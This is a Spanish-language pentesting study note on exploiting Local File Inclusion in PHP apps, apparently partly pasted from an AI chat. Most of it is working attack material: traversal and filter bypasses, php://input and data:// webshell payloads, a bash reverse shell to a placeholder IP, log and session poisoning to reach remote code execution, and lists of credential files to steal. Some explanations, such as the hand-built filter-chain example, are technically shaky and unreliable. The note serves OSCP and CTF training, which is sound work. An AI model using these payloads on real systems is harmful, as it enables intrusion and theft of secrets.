## 📚 Índice

- [[#🎯 **1. ¿Qué es LFI?**]]
- [[#🔍 **2. Señales de posible LFI (lo que debes reconocer como pentester)**]]
- [[#🌪️ **3. Path Traversal: lo básico**]]
- [[#🧰 4. Bypasses para filtros de LFI]]
    - [[#✔ 4.1 Replacement Filters]]
    - [[#✔ 4.2 Bypass con **preg_match()**]]
    - [[#✔ 4.3 Bypass por extensión obligatoria]]
    - [[#✔ 4.4 Substring Tricks]]
- [[#🧨 5. Wrappers (cuando todo lo demás falla)]]
    - [[#✔ 5.1 **php://filter** (leer código fuente)]]
    - [[#✔ 5.2 **php://input** (cuando tienes POST y allow_url_include=1)]]
    - [[#✔ 5.3 **data:// wrapper**]]
    - [[#✔ 5.4 Compatibilidad de null byte]]
- [[#📁 6. Archivos REALMENTE Útiles]]
    - [[#📂 **6.1 Archivos de credenciales — Los más valiosos**]]
    - [[#📂 **6.2 Archivos de Logs → LFI → RCE **]]
    - [[#📂 **6.3 Bash History**]]
    - [[#📂 **6.4 Archivos de Servicios comunes**]]
    - [[#📂 **6.5 Archivos para reconocimiento profundo**]]
- [[#🔥 **7. Explotación avanzada **]]
    - [[#✔ 7.1 Filter Chains → RCE en PHP moderno]]
    - [[#✔ 7.2 Log Poisoning → RCE]]
    - [[#✔ 7.3 Session Poisoning]]
- [[#🛡️ 8. Cómo defender]]
- [[#📌 **Checklist rápida para pentester**]]
- [[#Filter Chains MANUALES]]
    - [[#🧱 **¿Qué es EXACTAMENTE una filter chain hecha a mano?**]]
    - [[#🧨 **¿Qué filtros se usan realmente? (Lista profesional)**]]
    - [[#🧨 **¿Cuál es la técnica exacta que OTRA GENTE NO ENTIENDE?**]]
    - [[#🧨 **¿Cómo se arma una chain manual? — MÉTODO PASO A PASO**]]
    - [[#🧨 **Ejemplo REALISTA de exploitation (sin herramientas)**]]
    - [[#🧨 **CÓMO PROBAR FILTROS MANUALMENTE FUERA DEL SERVIDOR**]]
    - [[#🧨 **CUÁNDO USAS FILTER CHAIN (php://filter) PARA LEER ARCHIVOS**]]




---
## 🎯 **1. ¿Qué es LFI?**


LFI ocurre cuando una aplicación web **incluye archivos locales** usando datos controlados por el usuario (ej: `?page=`), sin sanitizar.  
Esto permite leer archivos del sistema y, en algunos casos, **RCE** mediante logs, wrappers, filtros o técnicas avanzadas.

---

## 🔍 **2. Señales de posible LFI (lo que debes reconocer como pentester)**

Banderas rojas que debes detectar:

- Parámetros tipo:
    
    ```
    ?page=
    ?template=
    ?file=
    ?view=
    ?path=
    ```
    
- App escrita en PHP y usa `include`, `require`, `include_once`, o `require_once`.
    
- Ficheros que cambian según query:  
    `index.php?page=home` → puede ser vulnerable.
    

---

## 🌪️ **3. Path Traversal: lo básico**

El atacante sube en el árbol de directorios con:

```
../../../../../../../../
```

Ejemplo:

```
?page=../../../../etc/passwd
```

Pero los desarrolladores suelen aplicar filtros. Por eso necesitas **bypasses**.

---

# 🧰 4. Bypasses para filtros de LFI

### ✔ 4.1 Replacement Filters

Si reemplazan `"../"` por vacío:

Tú envías:

```
....//
```

Porque:

- El dev reemplaza `"../"` → pero **"....//"** se convierte en **"../"** después del replace.
    

---

### ✔ 4.2 Bypass con **preg_match()**

Si prohíben `"../"` pero permiten `/`:

```
/....//....//etc/passwd
```

Si restringen `"etc/passwd"` exacto → cambia un char por `?`:

```
/etc/passwd?
```

---

### ✔ 4.3 Bypass por extensión obligatoria

Si la app concatena `.php`:

```
include($_GET['page'] . ".php");
```

**En PHP viejo (<5.3.4)** → usa **null byte termination**:

```
?page=/etc/passwd%00
```

El `%00` corta la cadena y anula el `.php`.

---

### ✔ 4.4 Substring Tricks

Si la validación revisa las últimas letras:

Ejemplo: prohíben que termine en `"passwd"`

Tu payload:

```
/etc/passwd/
```

Ese `/` final cambia la evaluación.

---

# 🧨 5. Wrappers (cuando todo lo demás falla)

PHP tiene wrappers poderos.

### ✔ 5.1 **php://filter** (leer código fuente)

El más usado para ver el **código fuente** sin ejecutar:

```
?page=php://filter/convert.base64-encode/resource=index.php
```

Decodificas y ves TODO el código fuente.
#### 📄 Payloads útiles de lectura rápida
```
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/resource=/etc/passwd
?page=php://filter/convert.iconv.UTF-16LE.UTF-8/resource=/ruta

```

---

### ✔ 5.2 **php://input** (cuando tienes POST y allow_url_include=1)

Permite enviar **PHP dentro del body**:

```
?page=php://input
```

Body:

```php
<?php system('id'); ?>
```
```
Burp → Repeater → cambiar GET por POST
URL: ?page=php://input

Body:
<?php system($_GET['cmd']); ?>

Ejecutar:
?page=php://input&cmd=id
```
Mas info de este metodo en la nota de #burpsuit 

---

### ✔ 5.3 **data:// wrapper** 
(RCE directo en versiones vulnerables)

```php
?page=data://text/plain,<?php system('id'); ?>
```

```php 
?page=data://text/plain,<?php system("bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'"); ?>
```
Mejor metodo: 
```php mejor metodo
data://text/plain;base64,<PAYLOAD_EN_BASE64>

```
recuerda el listener por nc 

---

### ✔ 5.4 Compatibilidad de null byte

- Funciona **solo** en PHP ≤ 5.3.4
    
- En sistemas modernos NO funciona.
    

---

# 📁 6. Archivos REALMENTE Útiles 

No pierdas tiempo leyendo /etc/hosts o /etc/passwd.  
Eso es lo más básico. Lo que importa es **oro para pivoting, credenciales y escalada**.

---

## 📂 **6.1 Archivos de credenciales — Los más valiosos**

### 🔐 **Linux**

- `/etc/shadow` → hashes reales (si tienes read permissions vía LFI+leak).
    
- `/root/.ssh/id_rsa` → clave privada del root.
    
- `/home/<user>/.ssh/id_rsa`
    
- `/var/www/html/config.php` → bases de datos.
    
- `/var/www/*/*config*` → Joomla, WordPress, Laravel, Symfony.
    
- `/var/www/html/.env` → **clave maestra de Laravel**, DB, Redis, mail.
    

---

## 📂 **6.2 Archivos de Logs → LFI → RCE **

Si puedes ejecutar un lfi es bello pq infectas los logs con alguna peticion tuya con el one liner y ya al llegar al log puedes hacer el clasico &cmd= y coronamos. 

Para **envenenar logs** y conseguir ejecución:

- `/var/log/apache2/access.log`
    
- `/var/log/apache2/error.log`
    
- `/var/log/nginx/access.log`
    
- `/var/log/nginx/error.log`
    Estos dos de abajo son de ssh. 
- `/var/log/auth.log`
- - `/var/log/btmp`
    
- `/var/log/mail.log`
    

Payload típico en User-Agent:

```
<?php system($_GET['cmd']); ?>
```

Y luego:

```
?page=/var/log/apache2/access.log&cmd=id
```

Boom. RCE.

---

## 📂 **6.3 Bash History**

Contiene comandos, claves, tokens, etc.

- `/home/<user>/.bash_history`
    
- `/root/.bash_history`
    

---

## 📂 **6.4 Archivos de Servicios comunes**

### MySQL

- `/etc/mysql/my.cnf`
    
- `/var/lib/mysql/*` (requiere permisos)
    

### SSH

- `/etc/ssh/ssh_config`
    
- `/etc/ssh/sshd_config`
    

### Cron Jobs

- `/etc/crontab`
    
- `/var/spool/cron/*`
    
- `/etc/cron.d/*`
    

### Apache/Nginx Virtual Hosts

- `/etc/apache2/sites-enabled/*`
    
- `/etc/nginx/sites-enabled/*`
    

---

## 📂 **6.5 Archivos para reconocimiento profundo**

- `/etc/passwd` → enumeración de usuarios.
    
- `/proc/self/environ` → variables del proceso actual (a veces RCE).
    
- `/proc/version`
    
- `/proc/cmdline`
    
- `/proc/net/tcp`
    

---

# 🔥 **7. Explotación avanzada **

## ✔ 7.1 Filter Chains → RCE en PHP moderno

Usa la herramienta:

🔗 **PHP Filter Chain Generator**  
[https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

Permite construir cadenas de filtros que terminan en **RCE sin necesidad de null byte**.

---

## ✔ 7.2 Log Poisoning → RCE

Combinar LFI + logs es una de las técnicas más usadas en CTF/OSCP.

Pasos:

1. Inyectas PHP en un header.
    
2. Lo guardas en un log.
    
3. Lo cargas con LFI.
    

---

## ✔ 7.3 Session Poisoning

Busca:

```
/var/lib/php/sessions/sess_<ID>
```

Si puedes controlar el contenido → RCE.

---

# 🛡️ 8. Cómo defender 

- Nunca usar `include($_GET['page'])`
    
- Usar allowlist real (lista de archivos permitidos)
    
- No concatenar extensiones inseguras
    
- Deshabilitar allow_url_include
    
- Filtros estrictos + canonicalización
    
- Evitar wrappers
    

---

# 📌 **Checklist rápida para pentester**

1. ¿Existe `page=` o similar?
    
2. ¿Funciona `../../`?
    
3. ¿Aplica concatenación de extensión?
    
4. Intenta null byte (`%00`).
    
5. Prueba wrappers (`php://filter`).
    
6. Busca archivos realmente valiosos (SSH, logs, .env, config.php).
    
7. Prueba log poisoning → RCE.
    
8. Prueba session poisoning.
    
9. Prueba filter chains.
    
---
## Filter Chains MANUALES

# 🧱 **¿Qué es EXACTAMENTE una filter chain hecha a mano?**

Es una cadena así:

```txt
php://filter/convert.*|string.*|convert.*|iconv.*|zlib.*|.../resource=ARCHIVO
```

Cada filtro:

- altera bytes
    
- codifica
    
- decodifica
    
- rota
    
- reescala
    
- recomprime
    

Hasta que **el output final del flujo** coincide EXACTAMENTE con tu payload PHP.

👉 O sea:

```
"contenido original del archivo"
    ↓ filtro A
"contenido transformado"
    ↓ filtro B
"contenido aún más transformado"
    ↓ filtro C
"<?php system($_GET['cmd']); ?>"   ← ESTE es el objetivo
```

---

# 🧨 **¿Qué filtros se usan realmente? (Lista profesional)**

## 🔹 1. `convert.base64-encode`

Transforma bytes → Base64  
→ limpia caracteres peligrosos

## 🔹 2. `convert.base64-decode`

Base64 → bytes  
→ reconstruye tu payload

## 🔹 3. `string.rot13`

Modifica letras sin generar caracteres peligrosos  
→ útil para pasar filtros

## 🔹 4. `convert.quoted-printable-encode`

Convierte bytes a formato `=XX`  
→ pasa firewalls + sanitizadores

## 🔹 5. `convert.quoted-printable-decode`

Restaura bytes

## 🔹 6. `convert.iconv.UTF8.UTF16LE`

Cambia codificación  
→ mueve offsets  
→ permite meter null bytes internos

## 🔹 7. `convert.iconv.UTF16LE.UTF8`

Revierte el proceso

## 🔹 8. `zlib.deflate` / `zlib.inflate`

Comprime / descomprime  
→ útil para "forzar" estructuras de bytes

---

# 🧨 **¿Cuál es la técnica exacta que OTRA GENTE NO ENTIENDE?**

> **Transformo un archivo existente a través de filtros,  
> hasta que el resultado final sea MI payload PHP.  
> Y sin herramientas externas.**

Puedes hacer:

### Base64 → rot13 → Base64 → iconv → decode final → output listo


---
# 🧨 **¿Cómo se arma una chain manual? — MÉTODO PASO A PASO**

## 🟩 1. Define tu payload final

Ejemplo OSCP clásico:

```
<?php system($_GET['cmd']); ?>
```

## 🟩 2. Pásalo a Base64, para entrar en php interactivo php -a

Ejemplo:

```
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

## 🟩 3. Aplica rot13

Esto evita detección y te da una capa más de control.  
(Este valor cambia según tu string.)

**funciones nativas de PHP**:

- `str_rot13()`
    
- `base64_encode()`
    
- `base64_decode()`
    
- `quoted_printable_encode()`
    
- `quoted_printable_decode()`
    
- `iconv()`
    
- `gzdeflate()`, `gzinflate()`
```
php > echo str_rot13("cadena original");
```

## 🟩 4. (Opcional) Aplica quoted-printable o iconv

Dependiendo del entorno.

## 🟩 5. Construye una chain que HAGA EL PROCESO INVERSO:

Ejemplo ilustrativo:

```
php://filter/read=
convert.base64-decode |
string.rot13 |
convert.base64-decode
/resource=index.php
```

### ¿Qué hace esa chain?

1. `base64-decode`  
    → decodifica la primera capa
    
2. `rot13`  
    → revierte el rot13
    
3. `base64-decode`  
    → decodifica contenido restante
    
4. **resultado final = tu payload real**
    

Y `include()` ejecuta ese resultado.

---

# 🧨 **Ejemplo REALISTA de exploitation (sin herramientas)**

### 1️⃣ Tu payload:

```
<?php system($_GET['cmd']); ?>
```

### 2️⃣ Lo codificas a Base64:

```
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### 3️⃣ Lo transformas con rot13 → (ejemplo ficticio):

```
CQ9jn...
```

### 4️⃣ Lo metes en un archivo que la LFI pueda leer

(por ejemplo un archivo log o un archivo estático pequeño que ya exista)

### 5️⃣ Construyes chain inversa:

```
?page=php://filter/read=convert.base64-decode|string.rot13|convert.base64-decode/resource=/var/log/apache2/access.log&cmd=id
```

### 6️⃣ PHP:

- lee el log
    
- aplica filtros
    
- transforma bytes exactamente como tú lo quieres
    
- obtiene tu payload original
    
- `include()` lo ejecuta
    
- 🎉 RCE lograda
    

---

Perfecto, bro. Esto que preguntas es **LA CLAVE** para realmente _entender_ filter chains a nivel OSCP, porque si no sabes **cómo probar cada transformación fuera del servidor**, nunca vas a saber _qué están haciendo realmente los filtros_.

Y sí:  
👉 **la forma correcta es usando una consola interactiva de PHP**  
(con `php -a`)  
o **archivos temporales** donde ejecutas manualmente cada filtro.

Te voy a explicar **exactamente cómo se hace**, paso a paso, como lo hace tu profesor y como se hace para OSCP — _sin herramientas automáticas_.

---

# 🧨 **CÓMO PROBAR FILTROS MANUALMENTE FUERA DEL SERVIDOR**

(🔥 El método REAL que usan los pentesters avanzados 🔥)

Tus herramientas:

- **PHP CLI**
    
- **PHP interactivo (`php -a`)**
    
- **funciones nativas de PHP**:
    
    - `str_rot13()`
        
    - `base64_encode()`
        
    - `base64_decode()`
        
    - `quoted_printable_encode()`
        
    - `quoted_printable_decode()`
        
    - `iconv()`
        
    - `gzdeflate()`, `gzinflate()`
        

Con esto puedes **simular EXACTAMENTE** lo que harían los filtros del wrapper `php://filter`.

---

# 🟩 1. ENTRA A LA CONSOLA INTERACTIVA DE PHP

En tu terminal:

```bash
php -a
```

Debe mostrar:

```
Interactive shell
php >
```

Todo lo que escribas ahí se ejecuta en tiempo real.

---

# 🟩 2. Aplica filtros manualmente (igual que php://filter)

### ROT13:

```php
php > echo str_rot13("cadena original");
```

### BASE64 encode:

```php
php > echo base64_encode("<?php system(\$_GET['cmd']); ?>");
```

### BASE64 decode:

```php
php > echo base64_decode("PD9waHAgc3...Pz4=");
```

### Quoted printable:

```php
php > echo quoted_printable_encode("<?php system('id'); ?>");
```

### Iconv (cambiar encoding):

```php
php > echo iconv("UTF-8", "UTF-16LE", "hola");
```

### Zlib compress:

```php
php > echo gzdeflate("hola");
```

### Zlib decompress:

```php
php > echo gzinflate("...bytes...");
```

---
Listo, bro. Te lo voy a dejar **clarísimo**, sin palabrería, sin teoría vacía, como si estuviéramos sentados frente al Kali:

# 🧨 **CUÁNDO USAS FILTER CHAIN (php://filter) PARA LEER ARCHIVOS**

Hay **3 escenarios clásicos** donde **leer un archivo con filter chain ES ÚTIL**, sin buscar RCE.

Estos son EXACTAMENTE los que te van a aparecer en máquinas reales (HTB/VulnHub/OSCP).

---

# ✔ **ESCENARIO 1 – Bypassear extensiones / filtros de archivo**

La web te deja incluir archivos, pero SOLO si son `.php` o `.txt`.

Ejemplo:

```
page=home.php
page=profile.txt
```

Si tú intentas:

```
page=/etc/passwd
```

→ **bloqueado** por extensión.

Pero con filter:

```
page=php://filter/convert.base64-encode/resource=/etc/passwd
```

BOOM.  
La aplicación ya no ve “passwd”, ve un **stream PHP**, que pasa todos los checks.

**Este es el caso MÁS común.**

---

# ✔ **ESCENARIO 2 – El contenido tiene caracteres que rompen la vista**

Algunos archivos contienen:

- null bytes
    
- binarios
    
- UTF-16/UTF-32
    
- símbolos que rompen HTML
    
- JSON raro
    
- configuraciones con BOM
    
- archivos largos con contenido ilegible
    

Si tú los lees directo → **se rompe**, o ves símbolos raros.

Entonces usas filter chain para **convertirlos a un formato limpio e imprimible**:

Ejemplo clásico:

```
php://filter/convert.base64-encode/resource=/var/www/html/config.php
```

O con iconv:

```
php://filter/convert.iconv.UTF-16LE.UTF-8/resource=/path/conf_weird.enc
```

Esto **NO es para RCE**,  
es para poder **LEER** un archivo roto o con encoding raro.

---

# ✔ **ESCENARIO 3 – Necesitas bypass de path traversal**

Muchos WAFs / sanitizadores bloquean cosas tipo:

```
../
./
%2e%2e/
```

Pero **no bloquean streams**.

Con filter chain evades TODA la sanitización:

```
php://filter/resource=/etc/passwd
```

O si necesitas encoding para ocultar la ruta:

```
php://filter/string.rot13/resource=/etc/passwd
```

**La web ve un stream → tú lees lo que quieras.**

---

# 🧨 AHORA EL ICONV (EL QUE TE CONFUNDIÓ)

`iconv` es **un filtro que cambia el encoding del archivo**.

Se usa para:

- convertir UTF-16, UTF-32, ISO-8859-1 a UTF-8
    
- leer archivos que rompen el output
    
- reconstruir bytes que la web mutila
    

Es poderoso porque **puedes encadenarlo** con otros filtros, tipo:

```
php://filter/convert.iconv.UTF-7.UTF-8
          /string.rot13
          /resource=/etc/shadow
```

Largo y feo, pero funciona.

### 🤘 ¿CUÁNDO VAS A NECESITAR ICONV REALMENTE?

- Cuando un archivo está en un encoding distinto.
    
- Cuando la web rompe caracteres raros.
    
- Cuando quieres que el contenido salga limpio en el navegador.
    
- Cuando bypass de sanitización requiere convertir el output.
    

**NO es para RCE.  
NO es para logs.  
Es para LECTURA pura.**

---

